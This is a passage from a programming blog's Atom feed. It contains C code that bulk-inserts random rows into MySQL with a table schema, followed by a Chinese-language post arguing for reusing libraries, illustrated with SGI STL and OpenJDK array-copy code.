        char* names[10] = {&quot;Mike&quot;, &quot;Bob&quot;, &quot;Jack&quot;, &quot;Alice&quot;, &quot;Cathy&quot;, &quot;Ann&quot;, &quot;Betty&quot;, &quot;Cindy&quot;, &quot;Mary&quot;, &quot;Jane&quot;};
        char* name;
        char letters[6];
        int number;
        unsigned int seed = omp_get_thread_num();

        mysql_autocommit(db_conn, 0);
        for(int i = 0; i &lt; 1; i++)
        {
            snprintf(query, 30000 * BUFFER_SIZE, &quot;INSERT INTO test(col1, col2, col3) VALUES&quot;);
            char* query_copy = query;
            for(int k = 0; k &lt; ROW_NUM / omp_get_num_threads(); k++)
            {
                name = names[rand_r(&amp;seed) % 10];
                for(int j = 0; j &lt; 5; j++)
                {
                    letters[j] = 'a' + rand_r(&amp;seed) % 5;
                }
                letters[5] = '\0';
                number = rand_r(&amp;seed) % 20 + 1;
                snprintf(insert_value, sizeof(insert_value), &quot;('%s', '%s', %d),&quot;, name, letters, number);
                query_copy = mystrcat(query_copy, insert_value);
            }
            *(query_copy - 1) = '\0';
            if(mysql_query(db_conn, query) != 0)
            {
                print_mysql_error(db_conn, &quot;insert error&quot;);
            }
        }

        mysql_commit(db_conn);
        free(query);
        mysql_close(db_conn);
        mysql_thread_end();
    }
    
    mysql_library_end();
}

void insert_test()
{
    MYSQL* db_conn = mysql_init(NULL);
    if(db_conn == NULL)
    {
        fprintf(stderr, &quot;mysql_init() failed\n&quot;);
        return;
    }
    if(mysql_real_connect(db_conn, DBHOST, USER, PASSWORD, DATABASE, 0, NULL, 0) == NULL)
    {
        fprintf(stderr, &quot;mysql_real_connect() failed\n&quot;);
        mysql_close(db_conn);
        return;
    }

    char*  query = (char*)malloc(30000 *  BUFFER_SIZE);
    char  insert_value[30];
    char* names[10] = {&quot;Mike&quot;, &quot;Bob&quot;, &quot;Jack&quot;, &quot;Alice&quot;, &quot;Cathy&quot;, &quot;Ann&quot;, &quot;Betty&quot;, &quot;Cindy&quot;, &quot;Mary&quot;, &quot;Jane&quot;};
    char* name;
    char letters[6];
    int number;
    srand(time(NULL));
    mysql_autocommit(db_conn, 0);

    for(int i = 0; i &lt; 1; i++)
    {
        snprintf(query, 30000 * BUFFER_SIZE, &quot;INSERT INTO test(col1, col2, col3) VALUES&quot;);
        char* query_copy = query;
        for(int k = 0; k &lt; ROW_NUM; k++)
        {
            name = names[rand() % 10];
            for(int j = 0; j &lt; 5; j++)
            {
                letters[j] = 'a' + rand() % 5;
            }
            letters[5] = '\0';
            number = rand() % 20 + 1;
            snprintf(insert_value, sizeof(insert_value), &quot;('%s', '%s', %d),&quot;, name, letters, number);
            query_copy = mystrcat(query_copy, insert_value);
        }
        *(query_copy - 1) = '\0';
        if(mysql_query(db_conn, query) != 0)
        {
            print_mysql_error(db_conn, &quot;insert error&quot;);
            return;
        }
    }

    mysql_commit(db_conn);
    free(query);
    mysql_close(db_conn);
}

char* mystrcat(char* dest, char* src)
{
    while(*dest) dest++;
    while(*dest++ = *src++);
    return --dest;
}

void print_mysql_error(MYSQL* conn, char* message)
{
    fprintf(stderr, &quot;%s\n&quot;, message);
    if(conn != NULL)
    {
    #if MYSQL_VERSION_ID &gt;= 40101
        fprintf(stderr, &quot;Error %u (%s): %s\n&quot;, mysql_errno(conn), mysql_sqlstate(conn), mysql_error(conn));
    #else
        fprintf(stderr, &quot;Error %u: %s\n&quot;, mysql_errno(conn), mysql_error(conn));
    #endif
    }
}</code></pre></noscript></div>




<div><script src='https://gist.github.com/2860838.js?file=table.sql'></script>
<noscript><pre><code>drop database if exists test;
create database test;
use test;

drop table if exists test;
create table test(
    id integer primary key auto_increment,
    /*col1 enum('Mike', 'Bob', 'Jack', 'Alice', 'Cathy', 'Ann', 'Betty', 'Cindy', 'Mary', 'Jane'),*/
    col1 char(5),
    col2 char(5),
    col3 tinyint
);</code></pre></noscript></div>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Why We Should Use Library]]></title>
    <link href="http://JiajunYao.github.com/blog/2012/04/22/why-we-should-use-library/"/>
    <updated>2012-04-22T12:39:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2012/04/22/why-we-should-use-library</id>
    <content type="html"><![CDATA[<p>库(Library)在wikipeida的定义如下：</p>

<blockquote><p>In computer science, a library is a collection of resources used to develop software. These may include pre-written code and subroutines, classes, values or type specifications.</p></blockquote>

<p>在我们写程序的过程中几乎每时每刻使用着库。我们在编码的过程中享受着库带给我们的便利和好处。现在的编程语言都会提供丰富的库给开发者调用，比如C++的库有STL、Boost, Java的库有Swing。像PHP，Python等更是提供了强大的库来帮助程序员开发网站(当然这些语言不仅能用来开发网站)，这些库针对网站开发中遇到的常见问题提供了解决方案。举个例子来说，假设我们要将一个PHP数组用json的格式传到客户端，在没有库的情况下我们可能要遍历整个数组然后按照json的格式构建一个string，这样至少需要四五行代码，可是现在一个json_enode就可以搞定了。并且无论数组是几维的，json_encode都能正确返回json格式的string。</p>

<div>
<span>在我看来，使用库函数有如下三个好处:</span>
<ol style="margin-left: 1.3em">
<li>代码复用</li>
<li>保证质量</li>
<li>提高效率</li>
</ol>
</div>




<!-- more -->


<h3>代码复用</h3>

<p>从软件工程的角度看，代码复用可以节约成本，提高开发效率，使代码易维护(只需维护一处地方即可)，除此之外代码复用也能提高整体软件的质量。当我们使用库的时候，自己写的代码量减少，这样出错的几率就相应的降低了，同时开发的速度也提高了。以前可能要花几分钟写的一段代码，现在只要一个调用就搞定了。从管理者的角度看软件的最大成本“人/月”得到了降低。</p>

<h3>保证质量</h3>

<p>这里的质量指的是库的质量。一般而言，官方提供的库的质量都是相当高的。这些代码都经过大量的测试和用户使用的考验。一旦有什么bug很容易发现，并且及时改正过来。同时编写这些库的人都是领域中的大牛，他们有着许多年的开发经验，写的代码照理说肯定比我们自己写的要质量高。在Effective C++中有这么一个Item: &#8220;Familiarize yourself with Boost&#8221;，在这个Item里面Meyers介绍了一个库在被Boost接受前经历的步骤，包括公开的同级评审(peer review)，评审经理的审查(review manager)，社区的正式评审(official review)。整个过程被boost概述为“讨论、精炼、多次提交直到感到满意”的循环。有着这样严格的审查过程，Boost库的质量可想而知。</p>

<h3>提高效率</h3>

<p>这里的效率是指程序执行时的时间和空间效率。一般而言库中提供程序的效率总是高于我们所写的程序(当然在某种特定的应用场景下，我们写的代码效率可能会更好，毕竟库是个通用的东西，它不可能考虑某个特别的应用场景)。下面就举3个典型的例子来说明库的效率：</p>

<p>第一个例子是SGI STL的power算法，其代码如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">template</span> <span class="o">&lt;</span><span class="k">class</span> <span class="nc">T</span><span class="p">,</span> <span class="k">class</span> <span class="nc">Integer</span><span class="p">,</span> <span class="k">class</span> <span class="nc">MonoidOperation</span><span class="o">&gt;</span>
</span><span class='line'><span class="n">T</span> <span class="n">power</span><span class="p">(</span><span class="n">T</span> <span class="n">x</span><span class="p">,</span> <span class="n">Integer</span> <span class="n">n</span><span class="p">,</span> <span class="n">MonoidOperation</span> <span class="n">op</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">identity_element</span><span class="p">(</span><span class="n">op</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="k">while</span><span class="p">((</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>            <span class="n">n</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>            <span class="n">x</span> <span class="o">=</span> <span class="n">op</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">T</span> <span class="n">result</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
</span><span class='line'>        <span class="n">n</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="k">while</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>            <span class="n">x</span> <span class="o">=</span> <span class="n">op</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span><span class='line'>            <span class="k">if</span><span class="p">((</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                <span class="n">result</span> <span class="o">=</span> <span class="n">op</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
</span><span class='line'>            <span class="n">n</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>从上面的代码可以看到这是一个power的非递归实现。为了效率作者没有使用递归的实现，尽管递归版本看上去更直观。为了效率作者连除法运算符都不敢用，都是用了移位和OR这些bitwise operator，这些bitwise operator在计算机中是算得最快的。我想我们自己写的power实现应该不会比它快吧。</p>

<p>第二个例子是SGI STL的copy算法，其脉络如图(来自侯捷老师的《STL源码剖析》):</p>

<p><img src="http://JiajunYao.github.com/images/post/why-we-should-use-library/sgi-stl-copy.png"></p>

<p>从上图可以看出，虽然copy算法给我们的是一个统一的接口，但其内部却是有多个实现方式，目的是针对不同的情况给出最佳的copy实现。为了利用memmove()，作者想尽了一切办法，又是泛化又是特化。同时作者对于for(;first!=last;&#8230;)和for(&#8230;; n &lt; last-first; &#8230;)这样两种循环方式的效率差异性都进行了考虑。所有这一切的目的只有一个就是提高效率。用侯捷老师的话说就是<q>强化效率无所不用其极</q>。关于更多SGI STL copy算法的实现，可以参考侯捷老师的《STL源码剖析》。</p>

<p>第三个例子是Java的数组拷贝算法：
为了高效的copy Java的数组，Java 类库专门提供了一个System.arraycopy的方法。那这个方法又有什么高级之处呢？通过查看源代码我们就可以发现这个方法是个native 方法。然后我们来看看OpenJDK是如何实现这个native方法的。经过一番查找可以找到以下代码代码片段：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="n">pd_conjoint_bytes</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">from</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">to</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">){</span>
</span><span class='line'>    <span class="n">memmove</span><span class="p">(</span><span class="n">to</span><span class="p">,</span> <span class="n">from</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="n">atomic_copy64</span><span class="p">(</span><span class="k">volatile</span> <span class="kt">void</span> <span class="o">*</span><span class="n">src</span><span class="p">,</span> <span class="k">volatile</span> <span class="kt">void</span> <span class="o">*</span><span class="n">dst</span><span class="p">){</span>
</span><span class='line'><span class="cp">#if defined(PPC) &amp;&amp; !defined(_LP64)</span>
</span><span class='line'>    <span class="kt">double</span> <span class="n">tmp</span><span class="p">;</span>
</span><span class='line'>    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">&quot;lfd %0,  0(%1)</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>                  <span class="s">&quot;stfd %0, 0(%2)</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>                  <span class="o">:</span> <span class="s">&quot;=f&quot;</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
</span><span class='line'>                  <span class="o">:</span> <span class="s">&quot;b&quot;</span><span class="p">(</span><span class="n">src</span><span class="p">),</span> <span class="s">&quot;b&quot;</span><span class="p">(</span><span class="n">dst</span><span class="p">));</span>
</span><span class='line'><span class="cp">#elif defined(S390) &amp;&amp; !defined(_LP64)</span>
</span><span class='line'>    <span class="kt">double</span> <span class="n">tmp</span><span class="p">;</span>
</span><span class='line'>    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">&quot;ld %0,  0(%1)</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>                  <span class="s">&quot;std %0, 0(%2)</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>                  <span class="o">:</span> <span class="s">&quot;=r&quot;</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
</span><span class='line'>                  <span class="o">:</span> <span class="s">&quot;a&quot;</span><span class="p">(</span><span class="n">src</span><span class="p">),</span> <span class="s">&quot;a&quot;</span><span class="p">(</span><span class="n">dst</span><span class="p">));</span>
</span><span class='line'><span class="cp">#else</span>
</span><span class='line'>    <span class="o">*</span><span class="p">(</span><span class="n">jlong</span> <span class="o">*</span><span class="p">)</span> <span class="n">dst</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">jlong</span> <span class="o">*</span><span class="p">)</span><span class="n">src</span><span class="p">;</span>
</span><span class='line'><span class="cp">#endif</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>我们又看到了memmove()，arraycopy的作者使用了JNI来调用了memmove()，为的就是效率。更恐怖的是这还有汇编指令，这些指令也能使数组拷贝变得十分高效。看到这，你觉得我们自己写的数组拷贝算法的效率能超过官方提供的吗？ 详细的如何剖析arraycopy方法请参见<a href="http://gutspot.com/2011/11/16/system-arraycopy%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">勇点的博客</a>。</p>

<p>看了这三个例子，我们应该能感受到库提供程序的效率了吧。即使我们能写出和库一样效率的算法，我们要花多少时间，写完的质量怎么样，这些都要打个问号。想想Java的System.arraycopy吧。</p>

<p>总的来说能使用库的时候尽量使用，这会使你的代码质量更高，效率更高。在软件工程中有句名言<q>Don&#8217;t Reinvent the Wheel</q>，这就是我们对待库的态度。当然作为学生来讲，我们不仅要能熟练的使用库，最好还能深入库的源代码，像大师们取经，这会让我们受益匪浅。</p>
]]></content>
  </entry>
  
</feed>
